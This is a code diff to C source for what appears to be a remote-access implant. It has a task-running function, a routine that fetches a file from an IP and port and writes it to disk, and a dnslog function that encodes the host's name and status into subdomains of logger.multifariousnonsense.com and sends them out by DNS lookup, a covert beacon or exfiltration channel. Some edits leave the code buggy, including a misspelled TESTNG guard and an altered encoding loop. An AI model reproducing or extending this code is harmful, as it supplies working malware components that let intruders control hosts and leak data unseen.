@@ -87,20 +87,6 @@ void setmyhostname()
     sprintf(ME, "dunno"); // Unsafe but good enough
 }
 
-/* Runtask For Windows
-void runtask(char *task) {
-    STARTUPINFOA si;
-    PROCESS_INFORMATION pi;
-    ZeroMemory(&si,sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi,sizeof(pi));
-    char *cmd = "c:\\Windows\\notepad.exe";
-    CreateProcessA(NULL, task, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi );
-}
-*/
-
-
-/* Runtask for Linux */
 void runtask(char *task)
 {
 #ifdef LINUX_VERSION
@@ -361,6 +347,8 @@ void webrequest(char* ip, int port, char* torequest, char* outpath) {
 
 #ifdef LINUX_VERSION
     int sockfd;
+    struct sockaddr_in servaddr;
+
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0)
         {
@@ -385,6 +373,8 @@ void webrequest(char* ip, int port, char* torequest, char* outpath) {
         else
         {
         // Send request
+            char request[256];
+            char inbuff[1024];
             _snprintf(request, sizeof(request), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", torequest, ME);
             send(sockfd, request, strlen(request), 0);
 
@@ -401,6 +391,7 @@ void webrequest(char* ip, int port, char* torequest, char* outpath) {
             }
 
             unlink(outpath); // Delete if already exists
+            FILE* fh;
             fh = fopen(outpath, "w");
 
             int sofar = 0;
@@ -448,23 +439,45 @@ void webrequest(char* ip, int port, char* torequest, char* outpath) {
 
 void dnslog(char* status)
 {
-    char tmp[256];
+    char tmp[500];
     char tmp2[256];
     int tmp2len=256;
+    int killequals;
     snprintf(tmp, 256, "%s - %s", ME, status);
-    originalb58encode(tmp, strlen(tmp), tmp2, &tmp2len);
+//    originalb58encode(tmp, strlen(tmp), tmp2, &tmp2len);
 
-    snprintf(tmp, 256, "%s.logger.multifariousnonsense.com", tmp2);
+    
+    base64encode(tmp, tmp2);
+    //kill the ending ='s
+    killequals = strlen(tmp2);
+#ifdef TESTING
+    printf ("killequals is %d\n",killequals);
+    printf ("tmp2 before killing is %s\n", tmp2);
+    printf ("tmp2[killequals] is %c\n", tmp2[killequals]);
+#endif
+    if (tmp2[killequals] == '=') tmp2[killequals] = '\0';  //think this never hits because zero based, but keeping
+    if (tmp2[killequals-1] == '=') tmp2[killequals-1] = '\0';
+    if (tmp2[killequals-2] == '=') tmp2[killequals-2] = '\0';
+#ifdef TESTING
+    printf ("tmp2 after killing = is %s\n",tmp2);
+#endif
+
+    snprintf(tmp, sizeof(tmp), "%s.logger.multifariousnonsense.com", tmp2);
 #ifdef WINDOWS_VERSION
     DNS_RECORD *dns_records;
 #ifdef TESTING
-    printf("sending log message of: %s", tmp);
+    printf("sending log message of: %s\n", tmp);
 #endif
     DnsQuery_A(tmp, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, NULL, &dns_records, NULL);
 
     DnsRecordListFree(dns_records, DnsFreeRecordList);
 #endif
+
 #ifdef LINUX_VERSION
+#ifdef TESTING
+    printf("sending log message of: %s", tmp);
+#endif
+
     struct hostent *hp = gethostbyname(tmp);
     //Suspect there's a memory leak here.  Need to free hp but not sure if simple free will do it.
 #endif
@@ -474,7 +487,9 @@ void dnslog(char* status)
 //Changed it to void type and killed return values.
 
 void base58encode(const char* in, const int in_len, char* out, int* out_len) {
+#ifdef TESTING
     printf("base58encode inbound length: %d\n", in_len);
+#endif
     const char* const BASE58_CHARS = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
     
 
@@ -490,10 +505,13 @@ void base58encode(const char* in, const int in_len, char* out, int* out_len) {
     // Count trailing zeros
     for (stop = in_len - 1; stop > 0 && in[stop] == '\0'; stop--);
 
+#ifdef TESTING
     printf("in is %s\n", in);
     printf("inlen is %d\n",in_len);
     printf("leading zeros: %d\n", start);
     printf("trailing zeros: %d\n", stop);
+#endif
+
     // Allocate enough space in output buffer
     int zero_count = 0;
     for (i = start; i <= stop; i++) {
@@ -502,13 +520,17 @@ void base58encode(const char* in, const int in_len, char* out, int* out_len) {
         }
     }
 
+#ifdef TESTING
     printf ("Zerocount is: %d\n", zero_count);
+#endif
 
     int out_size = ((stop - start + 1) * 138 / 100) + 1; // log(256) / log(58) + 1
     out_size += zero_count;
 
+#ifdef TESTING
     printf("out_size is %d\n",out_size);
     printf("out_len is %d\n", *out_len);
+#endif
     if (*out_len < out_size) {
         *out_len = out_size;
         return;
@@ -517,11 +539,15 @@ void base58encode(const char* in, const int in_len, char* out, int* out_len) {
 
 
     memset(out, BASE58_CHARS[0], out_size);
+#ifdef TESTING    
     printf("after memset\n");
+#endif
 
     // Convert input to base-58
     for (i = start, j = out_size - 2; i <= stop; i++) {
+#ifdef TESTNG
         printf("i is now: %d\n", i);
+#endif
         carry = in[i];
         idx = out_size - 2;
         while (carry || idx > j) {
@@ -533,16 +559,18 @@ void base58encode(const char* in, const int in_len, char* out, int* out_len) {
         }
         j = idx;
     }
-    
+#ifdef TESTING    
     printf ("AFter convert\n");
+#endif
     // Add leading '1's
     for (i = 0; i < start; i++) {
         out[j--] = BASE58_CHARS[0];
     }
 
     out[out_size - 1] = '\0';
-
+#ifdef TESTING
     printf("OUT is :%s:\nlength: %d", out,out_size-1);
+#endif
     return;
 }
 
@@ -578,19 +606,22 @@ void originalb58encode (const char* in, const unsigned int in_len, char* out, un
     *out_len = out_size;
 
     memset(out, BASE58_CHARS[0], out_size);
+#ifdef TESTING
     printf("After memset\n");
+#endif
 
     // Convert input to base-58
     for (i = start, j = out_size - 2; i <= stop; i++) {
         carry = in[i];
         idx = out_size - 2;
-        while (carry || idx > j) {
+        //while (carry || idx > j) {
+        while (idx > 0) {
             x = (unsigned int)out[idx];
             x = x * 256 + carry;
             carry = x / 58;
             out[idx] = BASE58_CHARS[x % 58];
             idx--;
-            printf ("loop\n");
+            printf ("loop idx is %d and j is %d\n", idx, j);
         }
         j = idx;
     }
@@ -602,7 +633,9 @@ void originalb58encode (const char* in, const unsigned int in_len, char* out, un
     
  
     out[out_size - 1] = '\0';
+#ifdef TESTING
     printf("out is: %s", out);
+#endif
     return;
 }
 
